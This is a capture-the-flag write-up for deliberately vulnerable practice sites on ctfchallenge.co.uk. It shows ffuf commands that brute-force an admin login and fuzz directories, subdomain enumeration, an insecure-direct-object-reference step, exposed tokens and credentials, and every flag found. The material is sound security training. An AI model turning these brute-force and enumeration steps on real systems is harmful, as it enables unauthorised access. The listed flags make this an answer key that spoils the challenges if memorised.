# ctfchallenge_co_uk


# target: vulnerable website for ctf(ctfchallenge.co.uk)

## easy | vulnbegin | 9 flags

### cookie used during automation: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9


### 4-flag : 
robots.txt --> http://www.vulnbegin.co.uk/secret_d1rect0y/ -->
```[^FLAG^2B22E2CB70E218510802B0359488F6A2^FLAG^]```

tools used and documentation:
#### nslookup -type=any vulnbegin.co.uk 8.8.8.8
The above command will query the DNS server for any default A,TXT,NS,SOA,SPF records. You will see from the results there is a TXT record with a flag.

### 1-flag: ```[^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]```

sublist3r -d vulnbegin.co.uk

The above query uses OSINT to discover domain names from various search engines and other data resources, from the result you will find an obscure subdomain if you visit it this will show you a flag

result:
server.vulnbegin.co.uk

v64hss83.vulnbegin.co.uk

### 3-flag 
```[^FLAG^E858ED9649E57BECE9ACD1A4C60D3446^FLAG^]``` on server.vulnbegin.co.uk
 
 ### 2-flag from sublister : ```[^FLAG^047524FE61AE6B5FD1D184994C7322FC^FLAG^]```


dnsrecon for finding subdomains using brute force
dnsrecon -d vulnbegin.co.uk -D ~/wordlists/subdomains.txt -t brt


content discovery using ffuf:
ffuf -p 0.1 -t 1 -w ~/wordlists/content.txt -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -u http://www.vulnbegin.co.uk/FUZZ


in this case username was admin but the response code is 200 for both valid and invalid requests:
to filter out 200 requets i used command:


ffuf -p 0.1 -t 1 -w ~/wordlists/passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200





### 5-flag 	```[^FLAG^93D7491FB4B054FB5C5AC3E0292BE41C^FLAG^]```





### 6-flag from brute forcing the directry or it can be achieved using ffuf
{"api_key":"X-Token: 492E64385D3779BC5F040E2B19D67742","flag":"```[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]"}```


### 7-flag from adding X-Token we got from cpanel/env 
{"messaged":"User Authenticated","flag":```"[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]"```}


### 8-flag 
"flag":```"[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]"```,

### 9-flag after indirect object reference for user 5 
```[^FLAG^3D82BE780F46EE86CE060D23E6E80639^FLAG^]```


# vulnlawyers | easy | target:vulnlawyers.co.uk | 6 flags

#### cookie used during fuzzing ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9

subdomain from sublister:
www.vulnlawyers.co.uk
data.vulnlawyers.co.uk
### flag-1
```[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^]```



### flag-2  in the redirect 302 request when login --> denied
where response look like
```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 05 Jul 2021 18:09:09 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9; expires=Wed, 04-Aug-2021 18:09:09 GMT; Max-Age=2592000; path=/; domain=.vulnlawyers.co.uk
Location: /denied
Content-Length: 1119

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VulnLawyers - Old Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/template-manager/style.css" rel="stylesheet">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <h1 style="padding-top:100px;text-align: center;color: #060505;letter-spacing: -1px;font-weight: bold">VulnLawyers</h1>
            <h3 class="text-center">We'll win that case!</h3>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <div class="alert alert-info">
                <p>Access to this portal can now be found here <a href=/lawyers-only">/lawyers-only</a></p>
                <p>[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^]</p>
            </div>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

```[^FLAG^FB52470E40F47559EBA87252B2D4CF67^FLAG^]```

hint from flag-2 : /lawyers-only 

## flag-3 from data.vulnlawyers.co.uk/users after fuzzing
```
{"users":[{"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk"},{"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk"},{"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk"},{"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk"},{"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk"}],"flag":"[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"}
```

### flag-4 after brute force from intruder 
email : jaskaran.lowe@vulnlawyers.co.uk password: summer

```
[^FLAG^7F1ED1F306FC4E3399CEE15DF4B0AE3C^FLAG^]

```

### flag-5 after lot of methods i found suspicious link in js source code fetching info from /lawyers-only-profile-details/4
from that i got all users endpoint containing the credentials
```
1-{"id":1,"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk","password":"Rk@c7#U3@2r%0f"}
2-{"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
3-{"id":3,"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk","password":"Sn06#ibx@lGPG7"}
5-{"id":5,"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk","password":"A^66vqhOU!e2ZV"}
```
```
[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]
```
### flag-6 admin login
```
[^FLAG^B38BAE0B8B804FCB85C730F10B3B5CB5^FLAG^]
```


## vulnforum | medium | 4 flags

cookie for fuzzing
ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9
